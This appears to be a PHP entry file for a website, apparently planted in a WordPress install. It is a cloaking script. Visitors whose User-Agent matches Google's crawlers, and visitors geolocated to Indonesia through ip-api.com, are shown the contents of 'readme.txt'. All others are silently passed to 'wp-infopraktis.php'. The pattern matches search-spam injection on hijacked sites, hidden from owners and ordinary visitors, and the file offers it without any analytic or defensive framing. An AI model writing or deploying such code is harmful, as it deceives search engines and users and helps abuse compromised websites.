<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    $bot_content = file_get_contents('readme.txt');
    echo $bot_content;
    exit;
}

 $ip = getUserIP();
 $api_url = "http://ip-api.com/json/{$ip}";

 $response = @file_get_contents($api_url);
 $data = json_decode($response, true);

if ($data && isset($data['status']) && $data['status'] == 'success' && $data['countryCode'] === 'ID') {
    $id_content = file_get_contents('readme.txt');
    echo $id_content;
    exit;
}

include('wp-infopraktis.php');
exit;

?>